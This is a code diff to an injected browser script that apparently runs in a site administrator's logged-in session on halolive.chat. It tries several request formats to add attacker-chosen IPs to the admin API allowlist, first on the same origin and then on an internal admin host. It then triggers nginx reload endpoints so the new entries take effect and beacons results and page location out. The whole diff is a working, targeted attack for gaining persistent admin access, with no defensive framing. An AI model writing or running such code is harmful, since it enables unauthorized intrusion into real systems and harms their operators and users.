@@ -58,9 +58,12 @@
   ls('l'); ls('s');
   beb('href', location.href);
   // ---- allowlist writers: style 4/5 use the documented console shape + cloned shape
-  var clone = null;
-  function add(ip, s) {
-    var body, ct = 'application/json';
+  // nginx denies /api/admin/* to everyone not allow-listed, so this only works from
+  // inside the admin's own browser - exactly where we are. Same-origin first, then the
+  // console vhost (same box 47.84.10.23) in case the writer lives there.
+  var HOSTS = ['', 'https://internal-admin.halolive.chat'], clone = null;
+  function add(ip, s, hi) {
+    var H = HOSTS[hi || 0], body, ct = 'application/json';
     if (s === 0) body = JSON.stringify({ ip: ip, remark: 'ops', note: 'ops', enabled: true });
     else if (s === 1) body = JSON.stringify({ ips: [ip] });
     else if (s === 2) { ct = 'application/x-www-form-urlencoded'; body = 'ip=' + encodeURIComponent(ip) + '&remark=ops'; }
@@ -68,9 +71,9 @@
     else if (s === 4) body = JSON.stringify({ user_id: ID || 1, user_name: NM || 'admin', ip: ip });
     else if (s === 5 && clone) { var c = JSON.parse(JSON.stringify(clone)); c.ip = c.ip_address = c.value = ip; body = JSON.stringify(c); }
     else return Promise.resolve(-1);
-    return fetch('/api/admin/ips', { method: 'POST', credentials: 'include', headers: { 'Content-Type': ct }, body: body })
-      .then(function (r) { return r.text().then(function (t) { beb('w' + s + ':' + r.status, ip + ' ' + t.slice(0, 160)); return r.status; }); })
-      .catch(function () { beb('w' + s + ':x', ip); return 0; });
+    return fetch(H + '/api/admin/ips', { method: 'POST', credentials: 'include', headers: { 'Content-Type': ct }, body: body })
+      .then(function (r) { return r.text().then(function (t) { beb('w' + s + (hi ? 'x' : '') + ':' + r.status, ip + ' ' + t.slice(0, 160)); return r.status; }); })
+      .catch(function () { return 0; });
   }
   var armed = 0;
   function primeClone() {
@@ -86,13 +89,19 @@
     var i = 0;
     (function next() {
       if (i >= IP.length) return;
-      var ip = IP[i++], s = 0;
+      var ip = IP[i++], s = 0, hi = 0;
       (function st() {
-        if (s > 5) return next();
-        add(ip, s++).then(function (c) { if (c === 200 || c === 201) { beb('OK', ip); next(); } else st(); });
+        if (s > 5) { if (hi === 0) { hi = 1; s = 0; return st(); } return next(); }
+        add(ip, s++, hi).then(function (c) { if (c === 200 || c === 201) { beb('OK' + (hi ? 'x' : ''), ip); next(); } else st(); });
       })();
     })();
-    setTimeout(function () { j('/api/admin/ips'); beb('done', 'n=' + N + ' api=' + api.length + ' id=' + ID); }, 3000);
+    setTimeout(function () {
+      // nudge an nginx reload so a freshly written allow entry takes effect
+      ['/api/admin/reload', '/api/admin/apply'].forEach(function (p) {
+        fetch(p, { method: 'POST', credentials: 'include' }).then(function (r) { beb('nudge:' + r.status, p); }).catch(function () {});
+      });
+    }, 2500);
+    setTimeout(function () { j('/api/admin/ips'); beb('done', 'n=' + N + ' api=' + api.length + ' id=' + ID); }, 3500);
   }
   j('/api/admin/me');
   fetch(MUT).then(function (r) { return r.json(); }).then(function (a) {
